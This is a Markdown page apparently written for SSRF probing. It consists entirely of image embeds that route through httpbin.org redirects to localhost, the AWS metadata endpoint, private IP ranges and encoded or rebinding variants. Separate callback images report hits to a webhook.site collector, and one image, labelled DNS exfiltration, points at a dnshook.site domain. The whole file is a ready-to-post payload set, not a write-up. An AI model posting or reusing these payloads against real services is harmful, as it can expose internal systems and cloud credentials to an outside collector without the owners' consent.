# Security Research - v26

## httpbin.org Redirect Chain SSRF Tests

Using httpbin.org's redirect-to endpoint to test redirect-based SSRF.

---

### 1) Baseline - External Redirect (Should work)
![ext-redirect](https://httpbin.org/redirect-to?url=https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/external-redir.gif)

---

### 2) Redirect to localhost variants

#### 127.0.0.1
![redir-127](https://httpbin.org/redirect-to?url=http://127.0.0.1/ssrf.gif)

#### localhost
![redir-localhost](https://httpbin.org/redirect-to?url=http://localhost/ssrf.gif)

#### 0.0.0.0
![redir-0](https://httpbin.org/redirect-to?url=http://0.0.0.0/ssrf.gif)

---

### 3) Redirect to AWS Metadata
![redir-meta](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)

---

### 4) Redirect to RFC1918 ranges
![redir-10](https://httpbin.org/redirect-to?url=http://10.0.0.1/ssrf.gif)
![redir-172](https://httpbin.org/redirect-to?url=http://172.16.0.1/ssrf.gif)
![redir-192](https://httpbin.org/redirect-to?url=http://192.168.1.1/ssrf.gif)

---

### 5) Multi-hop redirect chains

#### 2 hops to localhost
![2hop-local](https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=http://127.0.0.1/)

#### 3 hops to metadata
![3hop-meta](https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=http://169.254.169.254/)

---

### 6) URL-encoded redirect targets

#### Double-encoded localhost
![enc-local](https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%2F)

#### Unicode localhost (ⓛocalhost)
![unicode-local](https://httpbin.org/redirect-to?url=http://%E2%93%9Bocalhost/)

---

### 7) IPv6 localhost via redirect
![ipv6-local](https://httpbin.org/redirect-to?url=http://[::1]/)
![ipv6-ffff](https://httpbin.org/redirect-to?url=http://[::ffff:127.0.0.1]/)

---

### 8) Decimal/Hex IP via redirect
![decimal-ip](https://httpbin.org/redirect-to?url=http://2130706433/)
![hex-ip](https://httpbin.org/redirect-to?url=http://0x7f000001/)

---

### 9) DNS rebinding domains via redirect
![nip-local](https://httpbin.org/redirect-to?url=http://127.0.0.1.nip.io/)
![sslip-local](https://httpbin.org/redirect-to?url=http://127.0.0.1.sslip.io/)

---

### 10) Protocol downgrade via redirect
![https-to-http](https://httpbin.org/redirect-to?url=http://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/protocol-downgrade.gif)

---

### 11) Relative redirect (httpbin supports this)
![relative](https://httpbin.org/relative-redirect/3)

---

### 12) Success Callback
![success](https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/redirect-chain-success.gif)

### 13) DNS Exfil
![dns](https://v26-dns.c6cb2ba9-5868-422f-a30e-86133a87aa32.dnshook.site/dns.gif)

### 14) Canary
![v26-canary](https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/v26-canary.gif)

---

*v26 - httpbin.org redirect chain SSRF tests*
